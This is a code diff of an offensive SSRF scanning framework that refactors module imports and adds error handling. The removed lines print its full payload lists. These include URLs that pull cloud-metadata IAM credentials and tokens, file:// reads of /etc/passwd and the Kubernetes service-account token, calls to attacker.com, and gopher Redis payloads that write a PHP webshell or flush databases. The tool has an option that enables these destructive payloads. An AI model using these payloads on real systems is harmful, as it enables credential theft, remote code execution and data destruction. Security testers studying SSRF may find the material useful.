@@ -31,6 +31,11 @@ try:
 except ImportError:
     NETWORKX_AVAILABLE = False
 
+from ultimate_ssrf.ai import LLMClient, AISkills
+from ultimate_ssrf.cli import setup_argparse
+from ultimate_ssrf.payloads import DEFAULT_SSRF_PAYLOADS, DANGEROUS_SSRF_PAYLOADS
+from ultimate_ssrf.models import SSRFEvidence, DiscoveredEndpoint
+
 RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
 MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
 RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
@@ -45,151 +50,6 @@ BANNER = f"""
 ╚════════════════════════════════════════════════════════════════╝
 {RESET}"""
 
-DEFAULT_SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",
-    "http://169.254.169.254/latest/user-data/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
-    "http://169.254.169.254/latest/meta-data/public-keys/",
-    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
-    "http://169.254.169.254/latest/dynamic/instance-identity/document",
-    "http://169.254.169.254/latest/meta-data/services/domain",
-    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
-    "http://[::ffff:169.254.169.254]/latest/meta-data/",
-    "http://0x7f000001/",
-    "http://2130706433/",
-    "http://0254.0254.0169.0254/",
-    "http://169.254.169.254.nip.io/latest/meta-data/",
-    "http://1.0.0.127.bc.googleusercontent.com/latest/meta-data/",
-    "http://metadata.google.internal/computeMetadata/v1/",
-    "http://metadata.google.internal/computeMetadata/v1/instance/",
-    "http://metadata.google.internal/computeMetadata/v1/project/",
-    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-    "http://metadata.google.internal/0.1/meta-data/",
-    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-    "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net",
-    "http://100.100.100.200/latest/meta-data/",
-    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
-    "http://169.254.169.254/metadata/v1.json",
-    "http://169.254.169.254/metadata/v1/id",
-    "http://169.254.169.254/opc/v2/instance/",
-    "http://169.254.169.254/opc/v2/vnics/",
-    "http://metadata.tencentyun.com/latest/meta-data/",
-    "http://kubernetes.default.svc/api/v1/namespaces",
-    "http://kubernetes.default.svc/apis/apps/v1/deployments",
-    "http://169.254.169.254/latest/meta-data/kube-env/",
-    "https://kubernetes.default.svc/metrics",
-    "http://127.0.0.1/",
-    "http://127.0.0.1:80/",
-    "http://localhost/",
-    "http://0.0.0.0/",
-    "http://[::1]/",
-    "http://0/",
-    "http://0177.0.0.01/",
-    "http://127.1/",
-    "http://127.0.0.1.sslip.io/",
-    "http://localtest.me/",
-    "http://spoofed.burpcollaborator.net/",
-    "http://127.0.0.1:16969/",
-    "http://192.168.0.1/",
-    "http://10.0.0.1/",
-    "http://172.16.0.1/",
-    "file:///etc/passwd",
-    "file:///etc/hosts",
-    "file:///proc/self/environ",
-    "file:///proc/self/cmdline",
-    "file:///proc/self/cwd/app.py",
-    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
-    "file:///c:/windows/win.ini",
-    "file:///c:/windows/system32/drivers/etc/hosts",
-    "gopher://127.0.0.1:6379/_INFO",
-    "gopher://127.0.0.1:6379/_QUIT",
-    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
-    "gopher://127.0.0.1:3306/_",
-    "dict://127.0.0.1:6379/info",
-    "dict://127.0.0.1:6379/config%20get%20*",
-    "dict://127.0.0.1:11211/stats",
-    "dict://127.0.0.1:22/",
-    "ftp://127.0.0.1:21/",
-    "ftp://attacker.com/",
-    "ldap://127.0.0.1:389/",
-    "ldap://attacker.com/",
-    "sftp://127.0.0.1:22/",
-    "http://1.0.0.127.nip.io/",
-    "http://1.0.0.127.sslip.io/",
-    "http://localtest.me/",
-    "http://readme.localtest.me/",
-    "http://burpcollaborator.net/",
-    "http://metadata.nicob.net/",
-    "http://metadata.nicob.net/latest/meta-data/",
-    "http://127.0.0.1/%0d%0aX-Injected%3A%20true",
-    "http://your-collaborator.com/redirect?url=http://169.254.169.254/",
-    "php://filter/convert.base64-encode/resource=/etc/passwd",
-    "expect://id",
-    "jar:file:///etc/passwd!/",
-    "http://attacker.com/ssrf.svg",
-]
-
-DANGEROUS_SSRF_PAYLOADS = [
-    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
-    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0aset%20webshell%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%20%3F%3E%22%0d%0asave%0d%0a",
-    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
-    "gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3A%3Ctest%40test.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40test.com%3E%0d%0aDATA%0d%0aSubject%3A%20SSRF%20test%0d%0a%0d%0aTest%20body%0d%0a.%0d%0aQUIT%0d%0a",
-    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushdb%0d%0a",
-    "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$1%0d%0a1%0d%0a",
-]
-
-@dataclass
-class SSRFEvidence:
-    phase: str; technique: str; url: str; endpoint: str; param: str
-    payload: str; status: int; body_snippet: str; matched_patterns: List[str]
-    severity: str = "info"; request_headers: Optional[Dict] = None
-    response_headers: Optional[Dict] = None; out_of_band_hit: bool = False
-    impact_score: float = 0.0
-
-@dataclass
-class DiscoveredEndpoint:
-    path: str; method: str; params: Set[str]
-    accepts_url_param: bool; test_response_code: int; content_type: str
-
-def setup_argparse():
-    parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v4.2-experimental",
-                                     formatter_class=argparse.RawDescriptionHelpFormatter)
-    target_group = parser.add_mutually_exclusive_group()
-    target_group.add_argument("--target", "-t", help="Single target domain")
-    target_group.add_argument("--targets", help="Comma-separated targets")
-    target_group.add_argument("--target-file", "-f", help="File with targets (one per line)")
-    parser.add_argument("--callback", "-c", help="OOB callback host")
-    parser.add_argument("--collaborator", help="OAST-compatible callback host (alias for --callback)")
-    parser.add_argument("--burp-collaborator", help="Burp Collaborator host")
-    parser.add_argument("--delay", "-d", type=float, default=0.5)
-    parser.add_argument("--quiet", "-q", action="store_true")
-    parser.add_argument("--visible", action="store_true")
-    proxy_group = parser.add_argument_group("Proxy Support")
-    proxy_group.add_argument("--proxy", "-p", help="Single proxy URL (used for the entire scan)")
-    proxy_group.add_argument("--proxy-file", help="File with proxy list (one proxy per scan)")
-    proxy_group.add_argument("--proxy-type", choices=["http","socks5"], default="http")
-    ai_group = parser.add_argument_group("AI Integration (Optional)")
-    ai_group.add_argument("--ai-provider", choices=["claude","openai","ollama","gemini","mistral","deepseek","none"])
-    ai_group.add_argument("--ai-key", help="API key for cloud AI")
-    ai_group.add_argument("--ai-model", help="Specific model name")
-    feature_group = parser.add_argument_group("Feature Control")
-    feature_group.add_argument("--no-waf", action="store_true", help="Disable WAF detection")
-    feature_group.add_argument("--no-websocket", action="store_true", help="Disable WebSocket SSRF tests")
-    feature_group.add_argument("--no-grpc", action="store_true", help="Disable gRPC SSRF tests")
-    feature_group.add_argument("--no-k8s", action="store_true", help="Disable Kubernetes SSRF tests")
-    feature_group.add_argument("--no-serverless", action="store_true", help="Disable serverless SSRF tests")
-    feature_group.add_argument("--no-ai", action="store_true", help="Disable AI features")
-    feature_group.add_argument("--dangerous-payloads", action="store_true",
-                               help="Enable dangerous/destructive SSRF payloads (e.g., Redis flush, SMTP DATA)")
-    export_group = parser.add_argument_group("Export Options (experimental)")
-    export_group.add_argument("--export-nuclei", action="store_true", help="Export Nuclei templates (YAML if PyYAML installed)")
-    export_group.add_argument("--export-siem", action="store_true", help="Export CEF for SIEM")
-    export_group.add_argument("--export-json-api", action="store_true", help="Export JSON API report")
-    export_group.add_argument("--attack-map", action="store_true", help="Generate attack path graph (requires networkx)")
-    export_group.add_argument("--output", "-o", default=".", help="Output directory")
-    return parser
 
 class TargetManager:
     @staticmethod
@@ -493,7 +353,15 @@ class UltimateSSRFFramework:
             if p:
                 launch_opts["proxy"] = {"server": p}
                 if self.verbose: print(f"{CYAN}[PROXY]{RESET} {p}")
-        self.browser = await self.playwright.chromium.launch(**launch_opts)
+        try:
+            self.browser = await self.playwright.chromium.launch(**launch_opts)
+        except Exception as error:
+            await self.stop()
+            reason = str(error).splitlines()[0]
+            raise RuntimeError(
+                f"Playwright browser not available: {reason}. "
+                f"Run 'uv run playwright install chromium' from the project directory."
+            ) from error
         ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         await ctx.route("**/*", self._intercept)
         self.page = await ctx.new_page()
@@ -963,7 +831,11 @@ td{padding:8px;border-bottom:1px solid #333}
         if self.dangerous_payloads:
             print(f"{BOLD}{RED}DANGEROUS payloads enabled!{RESET}")
         print(f"{BOLD}{'='*50}{RESET}")
-        await self.start()
+        try:
+            await self.start()
+        except Exception as error:
+            print(f"{FAIL} {error}")
+            return
         try:
             await self.discover()
             if not self.no_waf:
@@ -1042,4 +914,8 @@ async def main():
             await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user.")
+        sys.exit(130)
